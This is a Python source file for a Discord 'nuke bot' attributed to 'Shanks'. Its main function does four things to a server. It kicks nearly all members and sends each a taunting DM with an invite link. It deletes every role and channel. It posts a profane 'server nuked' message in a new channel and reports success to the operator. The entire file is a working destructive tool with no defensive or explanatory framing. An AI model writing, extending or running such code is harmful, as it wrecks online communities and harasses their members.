import os
import discord
import asyncio
from typing import Optional

async def kick_member(member: discord.Member, reason: str = "Server Nuked by Shanks"):
    try:
        await member.kick(reason=reason)
        return True
    except:
        return False

async def delete_role(role: discord.Role):
    if role.name == "@everyone":
        return
    try:
        await role.delete()
    except:
        pass

async def delete_channel(channel: discord.abc.GuildChannel):
    try:
        await channel.delete()
    except:
        pass

async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.User, invite_link: str = None):
    """
    Nuke a server with full process:
    1. Use provided invite link (or create one)
    2. Kick all members (except bot and allowed users) with 1/sec delay,
       and send DM with invite link.
    3. Delete all roles (except @everyone) with 0.5 sec delay.
    4. Delete all channels, then create new text channel "fucked-by-shanks💀".
    """
    # Step 0: Use provided invite link or create one
    if not invite_link:
        # Try to create an invite link
        text_channel = next((c for c in guild.channels if isinstance(c, discord.TextChannel)), None)
        if text_channel is None:
            try:
                temp_channel = await guild.create_text_channel("temp-invite")
                invite = await temp_channel.create_invite(max_age=0, max_uses=0, reason="Nuke invite")
                invite_link = invite.url
            except:
                pass
        else:
            try:
                invite = await text_channel.create_invite(max_age=0, max_uses=0, reason="Nuke invite")
                invite_link = invite.url
            except:
                pass

    if not invite_link:
        invite_link = "No invite could be created."

    # Step 1: Kick members
    allowed_ids = [int(x.strip()) for x in os.getenv("ALLOWED_USERS", "").split(",") if x.strip().isdigit()]
    members_to_kick = [
        m for m in guild.members
        if m.id not in allowed_ids and m.id != bot.user.id and m.id != user.id
    ]

    # Send DM to each member and kick
    for member in members_to_kick:
        try:
            dm = await member.create_dm()
            embed = discord.Embed(
                title="💀 Server Nuked!",
                description=f"**{guild.name}** has been nuked by Shanks!",
                color=discord.Color.red()
            )
            embed.add_field(name="🔗 Join Here", value=f"[Click to join]({invite_link})", inline=False)
            embed.add_field(name="🔥 Reason", value="Nuked by Shanks 💀", inline=True)
            embed.set_footer(text="👺 Join for more information!")
            await dm.send(embed=embed)
        except:
            pass
        
        await kick_member(member)
        await asyncio.sleep(1)  # rate limit

    # Step 2: Delete roles
    roles = [r for r in guild.roles if r.name != "@everyone"]
    for role in roles:
        await delete_role(role)
        await asyncio.sleep(0.5)

    # Step 3: Delete channels
    for channel in guild.channels:
        await delete_channel(channel)
        await asyncio.sleep(0.5)

    # Step 4: Create new channel
    try:
        new_channel = await guild.create_text_channel("fucked-by-shanks💀")
        embed = discord.Embed(
            title="💀 SERVER NUKED!",
            description="This server has been destroyed by Shanks!",
            color=discord.Color.red()
        )
        embed.add_field(name="🔥 By", value="Shanks 💀", inline=True)
        embed.add_field(name="📅 Date", value=discord.utils.utcnow().strftime("%Y-%m-%d %H:%M:%S"), inline=True)
        embed.set_footer(text="👺 Join the destruction!")
        await new_channel.send(embed=embed)
    except:
        pass

    # Notify commander
    try:
        dm = await user.create_dm()
        embed = discord.Embed(
            title="✅ NUKE COMPLETE!",
            description=f"Successfully nuked **{guild.name}**!",
            color=discord.Color.green()
        )
        embed.add_field(name="👥 Members Kicked", value=len(members_to_kick), inline=True)
        embed.add_field(name="🔗 Invite Link", value=f"[Click to join]({invite_link})", inline=False)
        embed.set_footer(text="🔥 Shanks Nuke Bot")
        embed.timestamp = discord.utils.utcnow()
        await dm.send(embed=embed)
    except:
        pass
